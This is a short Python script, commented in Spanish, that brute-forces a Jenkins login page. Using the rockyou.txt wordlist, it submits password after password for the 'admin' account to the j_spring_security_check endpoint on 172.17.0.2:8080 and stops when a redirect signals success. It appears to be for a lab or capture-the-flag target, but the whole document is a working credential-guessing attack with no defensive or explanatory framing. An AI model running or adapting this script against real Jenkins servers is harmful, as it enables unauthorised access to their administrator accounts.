#Script para fuerza bruta de Login de Jenkins 
import requests

url = 'http://172.17.0.2:8080/j_spring_security_check'
diccionario = 'rockyou.txt'

headers = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; kali; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://172.17.0.2:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Cookie': 'JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}

with open(diccionario, 'r', encoding='latin-1') as file:
    for line in file:
        password_sin_espacios = line.strip()
        acceso = {
          'j_username': 'admin',
          'j_password': password_sin_espacios,
          'from': '/',
          'Submit': ''
        }

        # --- ESTAS LÍNEAS AHORA ESTÁN DENTRO DEL BUCLE ---
        response = requests.post(url, headers=headers, data=acceso, allow_redirects=False)

        if response.status_code == 302 and response.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
            print(f"Login correcto con el usuario admin y contraseña {password_sin_espacios}")
            break # <-- ¡MUY IMPORTANTE! Detiene el script cuando encuentra la contraseña.
        else:
            print(f"Intento fallido con la contraseña {password_sin_espacios}")